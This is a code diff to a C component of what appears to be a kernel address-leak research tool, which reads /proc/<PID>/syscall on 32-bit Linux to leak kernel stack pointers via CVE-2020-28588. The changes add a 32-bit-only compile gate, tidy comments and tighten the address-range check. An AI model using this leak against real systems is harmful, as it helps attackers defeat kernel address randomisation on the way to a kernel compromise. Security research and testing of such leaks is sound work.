@@ -35,8 +35,21 @@
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=631b7abacd02b88f4b0795c08b54ad4fc3e7c7c0
 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4f134b89a24b965991e7c345b9a4591821f7c2a6
 // https://cateee.net/lkddb/web-lkddb/HAVE_ARCH_TRACEHOOK.html
+//
+// 32-bit-kernel only — gated at compile time. The bug is in 32-bit kernels'
+// collect_syscall() (the high 32 bits of 64-bit syscall_info args are not
+// zeroed). 64-bit kernels follow a different code path and are not
+// vulnerable. On 64-bit kernels the argument-register values exposed by
+// /proc/<PID>/syscall are ordinary syscall numbers and pointers, none of
+// which carry the kernel-stack residue the exploit reads on 32-bit, and
+// misinterpreting a small integer (e.g. a syscall number) as a kernel
+// address would produce a nonsense observation.
 // ---
 // <bcoles@gmail.com>
+
+#if __SIZEOF_LONG__ != 4
+#error "Architecture is not supported"
+#endif
 
 #define _GNU_SOURCE
 #include "include/kasld/api.h"
@@ -61,7 +74,7 @@ KASLD_META("method:parsed\n"
            "patch:v5.10\n"
            "config:CONFIG_HAVE_ARCH_TRACEHOOK\n");
 
-unsigned long get_kernel_addr_proc_pid_syscall() {
+static unsigned long get_kernel_addr_proc_pid_syscall(void) {
   FILE *f;
   int iterations = 10;
   unsigned long addr = 0;
@@ -104,15 +117,12 @@ unsigned long get_kernel_addr_proc_pid_syscall() {
     while ((ptr = strtok(NULL, " ")) != NULL) {
       int reg_addr_len = strlen(ptr);
 
-      // Registers are printed without leading zeros. (0x00001234 -> "0x1234"),
+      // Registers are printed without leading zeros (0x00001234 -> "0x1234"),
       // possibly concatenated (0x0000abcd and 0x12345678 -> "0xabcd12345678").
       //
-      // We presume all register values are either 10 characters long for
-      // a single register value (8 character address with "0x" prefix) or
-      // between 11 and 18 characters long for concatenated registers.
-      //
-      // This usually works fine, but this means we'll miss kernel pointers if
-      // the kernel is mapped below 0x10000000 (ie, phys mapped at 0x0008000).
+      // Accept lengths 10 (single 8-hex-digit register with "0x" prefix) or
+      // 11–18 (two concatenated registers). Kernel pointers mapped below
+      // 0x10000000 (e.g. phys 0x00008000) are missed by this length check.
       if (reg_addr_len < 10 || reg_addr_len > 18)
         continue;
 
@@ -130,8 +140,8 @@ unsigned long get_kernel_addr_proc_pid_syscall() {
         unsigned long a = reg_addr >> 32;
         unsigned long b = reg_addr & 0xffffffff;
 
-        /* Use PAGE_OFFSET as lower bound rather than KERNEL_BASE_MIN.
-         * On 32-bit with 3G/1G split, KERNEL_BASE_MIN (0x40000000) overlaps
+        /* Use PAGE_OFFSET as lower bound rather than KERNEL_TEXT_MIN.
+         * On 32-bit with 3G/1G split, KERNEL_TEXT_MIN (0x40000000) overlaps
          * user-space, causing user register values (SP, LR, mmap addresses)
          * to be misidentified as kernel pointers. Kernel stack addresses
          * leaked by CVE-2020-28588 are always >= PAGE_OFFSET. */
@@ -156,7 +166,17 @@ unsigned long get_kernel_addr_proc_pid_syscall() {
       if (!leaked_addr)
         continue;
 
-      if (leaked_addr >= PAGE_OFFSET && leaked_addr <= KERNEL_BASE_MAX) {
+      /* Lower-bound floor: max(PAGE_OFFSET, KERNEL_TEXT_MIN). The original
+       * code used PAGE_OFFSET alone (correct on 32-bit-with-VMSPLIT where
+       * PAGE_OFFSET > KERNEL_TEXT_MIN) but admitted near-zero values on any
+       * arch where PAGE_OFFSET == 0 — s390 in particular. The arch gate
+       * above already prevents this component from compiling on 64-bit
+       * arches; the max() here is defence-in-depth so the validator stays
+       * sound even if the gate ever moves. */
+      unsigned long lo = PAGE_OFFSET > (unsigned long)KERNEL_TEXT_MIN
+                             ? PAGE_OFFSET
+                             : (unsigned long)KERNEL_TEXT_MIN;
+      if (leaked_addr >= lo && leaked_addr <= KERNEL_TEXT_MAX) {
         // printf("Found kernel pointer: %lx\n", leaked_addr);
         if (!addr || leaked_addr < addr)
           addr = leaked_addr;
